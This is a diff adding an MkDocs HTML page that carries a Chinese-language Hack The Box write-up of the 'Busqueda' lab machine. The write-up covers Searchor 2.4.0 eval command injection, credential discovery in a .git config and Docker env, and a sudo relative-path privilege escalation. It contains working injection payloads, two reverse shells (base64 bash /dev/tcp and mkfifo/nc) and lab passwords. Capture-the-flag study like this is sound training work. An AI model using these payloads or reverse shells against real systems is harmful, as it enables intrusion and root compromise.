@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="http://xvuln.com/HTB/Busqueda-DOC/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Busqueda - My Docs</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Busqueda";
+        var mkdocs_page_input_path = "HTB/Busqueda-DOC.md";
+        var mkdocs_page_url = "/HTB/Busqueda-DOC/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> My Docs
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">WEB 测试指南</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/%E6%A6%82%E8%BF%B0/">概述</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/">配置部署管理测试</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">HTB</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../HTB-Escape/">Escape</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">DOC</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../DOC/mkdocs/">Mkdocs 文档</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Read</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="" href="../../Read/三联生活周刊.md">三联生活周刊</a>
+                  </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="" href="https://book.hacktricks.xyz/">Hacktricks</a>
+                </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">My Docs</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a> &raquo;</li>
+      <li class="breadcrumb-item active">Busqueda</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="busqueda">Busqueda</h1>
+<p>难度：Easy</p>
+<p>机器作者：kavigihan</p>
+<p>审计(Prepared By)：dotguy</p>
+<p>日期：2023 年 5 月 6 日 / 文件编号 D23.100.235</p>
+<h2 id="_1">说明</h2>
+<p>简单难度的 <code>Linux</code> 机器，涉及 <code>Python</code> 模块中的命令注入漏洞。利用此漏洞，我们获得了对计算机用户 <code>svc</code> 的访问权限。对系统进一步枚举， 在<code>Git</code> 配置文件中发现凭据，并可以登录本地 <code>Gitea</code> 服务。此外，我们发现特定用户可以使用 <code>root</code> 权限执行系统检查脚本。通过利用此脚本，我们枚举了 <code>anministrator</code> 用户通过 <code>Gitea</code> 账户凭据的 <code>Docker</code> 容器。对 <code>Git</code> 存储库中的源码进一步分析，揭示了一种利用相对路径引用的方法，为我们授予具有 <code>root</code> 权限的 RCE 突破口。</p>
+<h3 id="_2">需要的知识</h3>
+<ul>
+<li>Web 枚举</li>
+<li>Linux 基础知识</li>
+<li>Python Basics</li>
+</ul>
+<h3 id="_3">学习到的知识</h3>
+<ul>
+<li>命令注入</li>
+<li>Python 代码审计</li>
+<li>Docker 基础</li>
+</ul>
+<h2 id="_4">信息收集</h2>
+<h3 id="nmap">Nmap</h3>
+<p>运行 Nmap 扫描主机开放的端口和服务</p>
+<pre><code class="language-shell">ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.208 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sV 10.10.11.208
+</code></pre>
+<p><img alt="nmap扫描结果" src="../Images/Busqueda-img/nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" /></p>
+<p>扫描结果显示 <code>SSH</code> 运行在其默认端口，并且 <code>Apache</code> Web 服务器正在端口 <code>80</code> 上运行。</p>
+<h3 id="http">HTTP</h3>
+<p>访问 <code>80</code> 端口后，我们被重定向到域名: <code>searcher.htb</code>。将该域名及对应的 IP 地址添加至 <code>/etc/hosts</code> 配置文件中，以允许我们在浏览器中访问。</p>
+<pre><code class="language-shell">echo &quot;10.10.11.208 searcher.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<p><img alt="searcher.htb主页" src="../Images/Busqueda-img/searcher.htb%E4%B8%BB%E9%A1%B5.png" /></p>
+<p>在浏览器中访问 searcher.htb 后，我们会看到“Searcher”应用程序的主页。它似乎是一个搜索引擎聚合器，允许用户在各种搜索引擎上搜索信息。</p>
+<p>用户可以选择搜索引擎，输入查询，然后自动重定向或获取搜索结果的 URL。</p>
+<p><img alt="searcher.htb搜索" src="../Images/Busqueda-img/searcher.htb%E6%90%9C%E7%B4%A2.png" /></p>
+<p>点击 <code>search</code> 按钮后，网站会提供指定搜索引擎的 <code>URL</code>。</p>
+<p><img alt="searcher.htb搜索示例" src="../Images/Busqueda-img/searcher.htb%E6%90%9C%E7%B4%A2%E7%A4%BA%E4%BE%8B.png" /></p>
+<h2 id="_5">立足点</h2>
+<p>值得注意的是，网站页脚显示它正在使用 <code>Flask</code> 和 <code>Searchor</code> 版本 <code>2.4.0</code> 。</p>
+<p><img alt="searcher.htb页脚版本号" src="../Images/Busqueda-img/searcher.htb%E9%A1%B5%E8%84%9A%E7%89%88%E6%9C%AC%E5%8F%B7.png" /></p>
+<blockquote>
+<h3 id="searchor">什么是 Searchor?</h3>
+<p>Searchor 是一个综合性的 Python 库，它简化了网页抓取、检索任何主题的信息以及创建搜索查询 URL 的过程。</p>
+</blockquote>
+<p>如果我们点击网页页脚中 “Searchor 2.4.0” 上的超链接，我们将被重定向到其 <a href="https://github.com/ArjunSharda/Searchor">GitHub 存储库</a>，在这里我们可以检查各个发布版本的变更日志。其中提到在 <code>2.4.2</code> 版本中修复了一个优先漏洞。该网站使用的版本是 <code>2.4.0</code>，这意味着它可能存在漏洞。</p>
+<p><img alt="searchor2.4.0github漏洞页面" src="../Images/Busqueda-img/searchor2.4.0github%E6%BC%8F%E6%B4%9E%E9%A1%B5%E9%9D%A2.png" /></p>
+<p>查看补丁，我们可以看到拉取请求是为了修补搜索功能中存在的命令注入漏洞，该漏洞是由于对未经净化的用户输入使用了 <code>eval</code> 语句而导致的。</p>
+<p><img alt="searchor2.4.0漏洞补丁截图" src="../Images/Busqueda-img/searchor2.4.0%E6%BC%8F%E6%B4%9E%E8%A1%A5%E4%B8%81%E6%88%AA%E5%9B%BE.png" /></p>
+<p>我们可以查看具体的 commit，其中显示了 <code>main.py</code> 文件中被替换的 <code>eval</code> 语句。</p>
+<p><img alt="searchor存储库 commit" src="../Images/Busqueda-img/searchor%E5%AD%98%E5%82%A8%E5%BA%93%20commit.png" /></p>
+<p><a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">exploit</a></p>
+<p>我们除了利用现成的exploit,也可以在本地计算机上下载 Searchor 2.4.0 模块并分析其代码。</p>
+<p>```shell
+ wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip
+unzip v2.4.0.zip</p>
+<pre><code>
+检查 `main.py` 文件，发现与提交类似，用户输入直接传递给 `eval` 语句，没有任何校验。
+
+```shell
+nano Searchor-2.4.0/src/searchor/main.py
+</code></pre>
+<p><img alt="searchor源码分析1" src="../Images/Busqueda-img/searchor%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901.png" /></p>
+<p><code>search()</code> 函数接受四个参数，我们可以控制其中两个: <code>engine</code> 和 <code>query</code>。</p>
+<pre><code class="language-shell">searchor search Google &quot;hackthebox&quot;
+</code></pre>
+<p><img alt="search()参数执行" src="../Images/Busqueda-img/search%28%29%E5%8F%82%E6%95%B0%E6%89%A7%E8%A1%8C.png" /></p>
+<p>在 CLI 工具中，<code>engine</code> 和 <code>query</code> 参数分别对应于第二个和第三个参数。关于命令注入，似乎可以注入两个参数，因为它们直接传递给 <code>eval</code> 语句。但是，在应用程序内，如果尝试将引擎修改为预定义引擎列表中不存在的选项，则会遇到错误。</p>
+<p>因此，我们必须重点利用查询参数作为注入点。值得注意的是，<code>eval</code> 语句通常不支持执行多行，尽管有一些技术可以实现这一点。此外，确保我们的有效负载不会破坏 <code>eval</code> 语句的前面部分也至关重要。考虑到所有这些因素，我们可以使用如下所示的有效负载来利用此漏洞并实现命令注入。</p>
+<pre><code class="language-shell">') + str(__import__('os').system('id')) #
+</code></pre>
+<p>为了确保 <code>eval</code> 语句剩余部分的执行，我们必须使用 <code>+</code> 运算符单独连接另一行的输出。需要注意的是，末尾的 <code>#</code> 符号充当注释，忽略其后面的任何内容。</p>
+<blockquote>
+<p>然后评估的整个命令将如下所示：
+<code>shell
+url = eval(
+Engine.&lt;some_engine&gt;.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})"
+)</code></p>
+</blockquote>
+<p>让我们首先在本地测试有效负载并验证代码注入是否按预期工作。</p>
+<pre><code class="language-shell">searchor search Google &quot;')+ str(__import__('os').system'id'))#&quot;
+</code></pre>
+<p><img alt="searcher命令注入payload执行结果" src="../Images/Busqueda-img/searcher%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5payload%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png" /></p>
+<p><code>id</code> 命令成功执行并返回，说明我们的注入成功了。为了验证远程主机上的代码执行，我们继续在 Web 应用程序的 <code>query</code> 参数中提交 Payload。</p>
+<pre><code class="language-shell">')+ str(__import__('os').system('id'))#
+</code></pre>
+<p><img alt="searcher命令注入远程payload" src="../Images/Busqueda-img/searcher%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8Bpayload.png" /></p>
+<p>我们以用户 <code>svc</code> 的身份执行代码</p>
+<p><img alt="searcher命令注入远程payload执行结果" src="../Images/Busqueda-img/searcher%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8Bpayload%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png" /></p>
+<p>为了将其利用到交互式 shell 中，我们首先在本地计算机上的端口 <code>1337</code> 上启动 <code>Netcat</code> 侦听。</p>
+<pre><code class="language-shell">nc -nvlp 1337
+</code></pre>
+<p>然后，我们在 <code>Searcher</code> 网站的 <code>query</code> 参数中发送以下 Base64 编码的反向 shell 负载。</p>
+<pre><code class="language-shell">')+ str(__import__('os').system('echo
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNS8xMzM3IDA+JjE=|base64 -d|bash'))#
+</code></pre>
+<blockquote>
+<p>您可以使用 <a href="https://www.revshells.com/">revshells</a> 等网站生成适合您的 IP 地址的编码有效负载。</p>
+</blockquote>
+<p>我们在 <code>Netcat</code> 监听器上获得了一个反向 shell。</p>
+<p><img alt="nc-nlvp1337" src="../Images/Busqueda-img/nc-nlvp1337.png" /></p>
+<p>用户标志可以在 <code>/home/svc/user.txt</code> 获取。</p>
+<pre><code class="language-shell">cat /home/svc/user.txt
+</code></pre>
+<h2 id="_6">权限提升</h2>
+<p>通过枚举远程主机上的文件，我们可以识别存储在 <code>/var/www/app/.git/config</code> 文件中的凭证对 <code>cody:jh1usoih2bkjaspwe92</code> 。它还包含对 <code>gitea.searcher.htb</code> 子域的引用。</p>
+<pre><code class="language-shell">cat /var/www/app/.git/config
+</code></pre>
+<p><img alt="var/www/app/.git/config" src="../Images/Busqueda-img/var-www-app-.git-config.png" /></p>
+<p>我们可以尝试使用获得的密码 <code>jh1usoih2bkjaspwe92</code> 以 <code>svc</code> 用户身份通过​​ SSH 登录。</p>
+<pre><code class="language-shell">ssh svc@10.10.11.208
+</code></pre>
+<p><img alt="sshsvc" src="../Images/Busqueda-img/sshsvc.png" /></p>
+<p>回到 <code>gitea.searcher.htb</code> 域，让我们在 <code>/etc/hosts</code> 文件中为其添加一个条目。</p>
+<pre><code class="language-shell">echo &quot;10.10.11.208 gitea.searcher.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<p>在浏览器中访问 <code>gitea.searcher.htb</code> 后，我们会看到 <code>Gitea</code> 主页。</p>
+<blockquote>
+<h3 id="gitea">什么是 Gitea?</h3>
+<p>Gitea 是一个自托管、轻量级、开源的 <code>Git</code> 服务，提供用于管理 <code>Git</code> 存储库的 Web 界面。它是一个版本控制服务器，类似于 <code>GitHub</code> 或 <code>GitLab</code> 等流行平台，但被设计为轻量级、易于安装且消耗更少的系统资源。</p>
+</blockquote>
+<p><img alt="Gitea主页" src="../Images/Busqueda-img/Gitea%E4%B8%BB%E9%A1%B5.png" /></p>
+<p>在“Explore”部分下，可以看到 Gitea 应用程序上有 2 个用户，分别是 <code>cody</code> 和 <code>administrator</code>。</p>
+<p><img alt="Gitea用户" src="../Images/Busqueda-img/Gitea%E7%94%A8%E6%88%B7.png" /></p>
+<p>我们可以使用之前获得的凭据以用户 <code>cody</code> 身份登录，却发现名为 <code>Searcher_site</code> 的私有存储库，其中包含 Searcher Web 应用程序的源代码。</p>
+<p><img alt="searcher Web源码" src="../Images/Busqueda-img/searcherWeb%E6%BA%90%E7%A0%81.png" /></p>
+<p>由于我们没有 andminisrator 用户的密码，因此我们无法检查与该用户关联的私有存储库。尽管如此，如果我们稍后获得密码，记住重新访问这一点是值得的。继续，我们可以检查用户 <code>svc</code> 的 sudo 权限，发现我们可以以 <code>root</code> 身份运行命令 <code>/usr/bin/python3 /opt/scripts/system-checkup.py *</code> </p>
+<pre><code class="language-shell">sudo -l
+</code></pre>
+<p><img alt="sudo-l" src="../Images/Busqueda-img/sudo-l.png" /></p>
+<p>当尝试读取文件 <code>/opt/scripts/system-checkup.py</code> 时，由于 <code>svc</code> 用户权限不足，我们收到 <code>permission denied</code> 错误。 <code>svc</code> 用户只拥有该文件的执行权限，没有读取权限。</p>
+<pre><code class="language-shell">ls -l /opt/scripts/system-checkup.py
+</code></pre>
+<p><img alt="ls-system-chekkup.py" src="../Images/Busqueda-img/ls-system-chekkup.py.png" /></p>
+<p>执行 Python 脚本后，会出现一个显示可用参数的帮助菜单。</p>
+<pre><code class="language-shell">sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre>
+<p><img alt="system-checkup *执行" src="../Images/Busqueda-img/system-checkup%2A%E6%89%A7%E8%A1%8C.png" /></p>
+<p>检查提供的参数，<code>/opt/scripts/system-checkup.py</code> 脚本似乎允许我们查看现有的 <code>Docker</code> 容器。使用 <code>docker-ps</code> 参数，它会列出所有正在运行的容器。</p>
+<pre><code class="language-shell">sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+</code></pre>
+<p><img alt="system-checktup-docker-ps" src="../Images/Busqueda-img/system-checktup-docker-ps.png" /></p>
+<p>它类似于 Docker 实用程序的 <code>docker ps</code> 命令的输出。当使用 <code>docker-inspect</code> 参数执行脚本时，使用信息表明它需要两个特定参数： <code>format</code> 和 <code>container name</code> 。</p>
+<pre><code class="language-shell">sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+</code></pre>
+<p><img alt="system-checkup-docker-inspect" src="../Images/Busqueda-img/system-checkup-docker-inspect.png" /></p>
+<p>尽管我们知道容器名称，但我们不知道这个格式参数指的是什么。但是，考虑到使用 <code>docker-ps</code> 参数和 <code>docker ps</code> 命令的脚本输出之间的相似性，可以合理地假设脚本中的 <code>docker-inspect</code> 参数利用 Docker 实用程序的 <code>docker inspect</code> 命令。因此，让我们看一下 <code>docker inform</code> 命令的帮助菜单。</p>
+<p>我们可以在<a href="https://docs.docker.com/engine/reference/commandline/inspect/">这里</a>查看<code>docker inspect</code>命令的使用信息。</p>
+<p><img alt="dockerinspect命令options" src="../Images/Busqueda-img/dockerinspect%E5%91%BD%E4%BB%A4options.png" /></p>
+<p>根据<a href="https://docs.docker.com/config/formatting/">此处</a>提供的信息，Docker 利用 <code>Go</code> 模板使用户能够修改特定命令的输出格式。该网站特别提到了 <code>{{json .}}</code> 格式化模板的用法，该模板以 JSON 格式呈现有关容器的所有信息。因此，我们可以使用 <code>{{json .}}</code> 作为脚本的 <code>docker-inspect</code> 参数所需的格式参数。</p>
+<p>为了方便读取 <code>JSON</code> 输出，我们可以使用 <code>jq</code> 将 JSON 输出解析为可读格式。可以使用以下命令安装 <code>jq</code>，但是它已经存在于目标计算机上。</p>
+<pre><code class="language-shell">sudo apt-get -y install jq
+</code></pre>
+<p>现在让我们使用 <code>docker-inspect</code> 指定符合格式的参数运行脚本。</p>
+<pre><code class="language-shell">sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
+</code></pre>
+<p>我们可以检查一下，发现 <code>Env</code> 部分中硬编码的 <code>Gitea</code> 密码，该部分由环境变量组成。</p>
+<pre><code class="language-shell">[** SNIP **]
+&quot;Tty&quot;: false,
+&quot;OpenStdin&quot;: false,
+&quot;StdinOnce&quot;: false,
+&quot;Env&quot;: [
+&quot;USER_UID=115&quot;,
+&quot;USER_GID=121&quot;,
+&quot;GITEA__database__DB_TYPE=mysql&quot;,
+&quot;GITEA__database__HOST=db:3306&quot;,
+&quot;GITEA__database__NAME=gitea&quot;,
+&quot;GITEA__database__USER=gitea&quot;,
+&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,
+&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,
+&quot;USER=git&quot;,
+&quot;GITEA_CUSTOM=/data/gitea&quot;
+ ],
+&quot;Cmd&quot;: [
+&quot;/bin/s6-svscan&quot;,
+&quot;/etc/s6&quot;
+ ],
+[** SNIP **]
+</code></pre>
+<p>使用获得的密码 <code>yuiu1hoiu4i5ho1uh</code> ，我们可以以 <code>administrator</code> 用户身份登录 <code>Gitea</code> 应用程序。</p>
+<p>现在，我们可以枚举上述私有存储库来查找 <code>scripts</code> 存储库，其中包含我们在远程主机的 <code>/opt/scripts</code> 目录中看到的文件。</p>
+<p><img alt="administrator-scripts" src="../Images/Busqueda-img/administrator-scripts.png" /></p>
+<p>因此，我们应该检查 <code>system-checkup.py</code> 文件，因为我们能够在远程主机上以 <code>root</code> 权限执行 <code>/opt/scripts/system-checkup.py</code> 文件。在分析代码的过程中，我们发现我们尚未检查的 <code>full-checkup</code> 参数执行了一个名为 <code>full-checkup.sh</code> 的 bash 脚本。</p>
+<p><img alt="full-checkup.sh" src="../Images/Busqueda-img/full-checkup.sh.png" /></p>
+<p>特别有趣的是，<code>system-checkup.py</code> 脚本使用相对路径 <code>./full-checkup.sh</code> 引用 <code>full-checkup.sh</code> 脚本，而不是使用绝对路径，例如 <code>/opt/scripts/fullcheckup.sh</code> ，在 <code>system-checkup.py</code> 文件中。这表明 <code>system-checkup.py</code> 脚本尝试从执行 <code>system-checkup.py</code> 的目录执行 <code>full-checkup.sh</code>。</p>
+<p>从 <code>full-checkup.sh</code> 文件所在的 <code>/opt/scripts/</code> 目录运行时，<code>system-checkup.py</code> 成功执行。</p>
+<pre><code class="language-shell">cd /opt/scripts/
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre>
+<p><img alt="system-checkup.py执行" src="../Images/Busqueda-img/system-checkup.py%E6%89%A7%E8%A1%8C.png" /></p>
+<p>我们现在尝试通过从包含我们自己的恶意 <code>full-checkup.sh</code> 脚本的另一个目录执行系统检查脚本来利用对 <code>full-checkup.sh</code> 的相对引用。</p>
+<p>因此，让我们创建一个文件 <code>/tmp/full-checkup.sh</code> 并向其中插入反向 shell Payload。</p>
+<pre><code class="language-shell">echo -en &quot;#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; 9001 &gt;/tmp/f&quot; &gt; /tmp/full-checkup.sh
+</code></pre>
+<p>然后我们赋予它执行权限</p>
+<pre><code class="language-shell">chmod +x /tmp/full-checkup.sh
+</code></pre>
+<p>接下来，我们在本地计算机的端口 <code>9001</code> 上启动 <code>Netcat</code> 侦听器以接收反向 shell。</p>
+<pre><code class="language-shell">nc -nvlp 9001
+</code></pre>
+<p>最后，我们在远程主机上的 <code>/tmp</code> 目录中运行以下命令来触发反向 shell。</p>
+<pre><code class="language-shell">cd /tmp
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre>
+<p>在远程主机上运行上述命令后，我们会在侦听器端口 <code>9001</code> 上以 <code>root</code> 用户身份收到一个 shell。</p>
+<p><img alt="getshell" src="../Images/Busqueda-img/getshell.png" /></p>
+<p>root flag 在 <code>/root/root.txt</code> 获取。</p>
+<pre><code class="language-shell">cat /root/root.txt
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
